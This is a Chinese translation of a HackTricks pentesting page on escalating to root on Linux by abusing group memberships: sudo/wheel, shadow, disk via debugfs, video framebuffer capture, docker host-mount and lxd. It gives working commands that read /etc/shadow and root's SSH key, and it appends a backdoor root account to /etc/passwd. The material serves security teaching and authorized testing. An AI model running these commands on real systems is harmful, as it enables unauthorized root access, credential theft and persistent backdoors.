# 有趣的组 - Linux提权

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## Sudo/Admin组

### **PE - 方法1**

**有时候**，**默认情况下（或因为某些软件需要）**在**/etc/sudoers**文件中，你可以找到以下一些行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着**任何属于sudo或admin组的用户都可以作为sudo执行任何操作**。

如果是这种情况，要**成为root用户，只需执行以下命令**：
```
sudo su
```
### 提权 - 方法2

查找所有的suid二进制文件，并检查是否存在二进制文件 **Pkexec** ：
```bash
find / -perm -4000 2>/dev/null
```
如果你发现二进制文件 **pkexec 是一个SUID二进制文件**，并且你属于 **sudo** 或 **admin** 组，那么你可能可以使用 `pkexec` 以sudo权限执行二进制文件。\
这是因为通常这些组是 **polkit策略** 中的组。该策略基本上确定了哪些组可以使用 `pkexec`。使用以下命令进行检查：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在这里，你会发现哪些组被允许执行**pkexec**，并且在某些Linux发行版中，默认情况下会出现**sudo**和**admin**组。

要**成为root用户，你可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果您尝试执行**pkexec**并出现以下**错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你没有连接到没有图形界面的环境**。这个问题有一个解决方法，可以在这里找到：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要**2个不同的ssh会话**：

{% code title="会话1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

有时候，在 **/etc/sudoers** 文件中，默认情况下可以找到以下行：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着**任何属于wheel组的用户都可以以sudo身份执行任何操作**。

如果是这种情况，**要成为root用户，只需执行以下命令**：
```
sudo su
```
## Shadow Group

来自**shadow组**的用户可以**读取**`/etc/shadow`文件：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，阅读文件并尝试**破解一些哈希值**。

## 磁盘组

这个权限几乎等同于**root访问权限**，因为您可以访问机器内的所有数据。

文件：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
请注意，使用debugfs您也可以**写入文件**。例如，要将`/tmp/asd1.txt`复制到`/tmp/asd2.txt`，可以执行以下操作：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
然而，如果你尝试**写入属于root的文件**（如`/etc/shadow`或`/etc/passwd`），你将会收到"**Permission denied**"的错误。

## Video组

使用命令`w`，你可以找到**谁在系统上登录**，并且它会显示如下输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi** 在机器上物理登录到一个终端。

**video组**可以访问屏幕输出。基本上你可以观察屏幕。为了做到这一点，你需要以原始数据的形式**获取屏幕上的当前图像**，并获取屏幕正在使用的分辨率。屏幕数据可以保存在 `/dev/fb0`，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到这个屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开**原始图像，您可以使用**GIMP**，选择\*\*`screen.raw` \*\*文件，并选择文件类型为**原始图像数据**：

![](<../../../.gitbook/assets/image (287) (1).png>)

然后修改宽度和高度为屏幕上使用的值，并检查不同的图像类型（选择显示屏幕效果最好的类型）：

![](<../../../.gitbook/assets/image (288).png>)

## Root组

默认情况下，**root组的成员**似乎可以访问**修改**一些**服务**配置文件、一些**库**文件或**其他有趣的东西**，这些可能被用于提升权限...

**检查root组成员可以修改的文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 组

您可以将主机机器的根文件系统挂载到实例的卷上，这样当实例启动时，它会立即将 `chroot` 加载到该卷中。这实际上给了您在机器上的 root 权限。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最后，如果你不喜欢之前的建议，或者由于某些原因（比如docker api防火墙），它们不起作用，你可以尝试**运行一个特权容器并从中逃逸**，如下所述：

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

如果你对docker套接字具有写权限，请阅读[**这篇关于如何滥用docker套接字提升权限的文章**](../#writable-docker-socket)**。**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd组

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm组

通常，**`adm`**组的成员具有**读取日志**文件的权限，这些文件位于_/var/log/_目录下。\
因此，如果你已经入侵了该组中的用户，你应该一定要**查看日志**。

## Auth组

在OpenBSD中，**auth**组通常可以写入_**/etc/skey**_和_**/var/db/yubikey**_文件夹（如果使用）。\
可以使用以下漏洞滥用这些权限以**提升为root权限**：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
